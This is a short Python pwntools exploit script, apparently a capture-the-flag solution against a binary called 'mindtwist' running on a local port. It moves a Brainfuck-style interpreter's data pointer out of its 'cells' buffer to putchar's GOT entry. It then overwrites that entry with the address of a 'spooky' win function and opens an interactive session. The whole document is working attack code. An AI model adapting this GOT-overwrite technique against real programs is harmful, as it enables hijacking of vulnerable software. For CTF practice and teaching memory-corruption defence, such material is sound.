#!/usr/bin/env python3
from pwn import *

elf = ELF("./mindtwist")

init_payload = b""
secondary_payload = b""

putchar_got = elf.got["putchar"]
cells_addr = elf.symbols["cells"]
win_func = elf.symbols["spooky"]

distance = putchar_got - cells_addr

#Move to putchar got
if distance < 0:
    init_payload += b"<"*abs(distance)
else:
    init_payload += b">"*abs(distance)

init_payload += b",>"*8
init_payload += b"." # trigger putchar

secondary_payload = win_func.to_bytes(8, "little")

#p = process("./mindtwist")
p = remote("127.0.0.1", 30001)

p.sendline(init_payload)
p.sendline(secondary_payload)
p.interactive()

p.close()
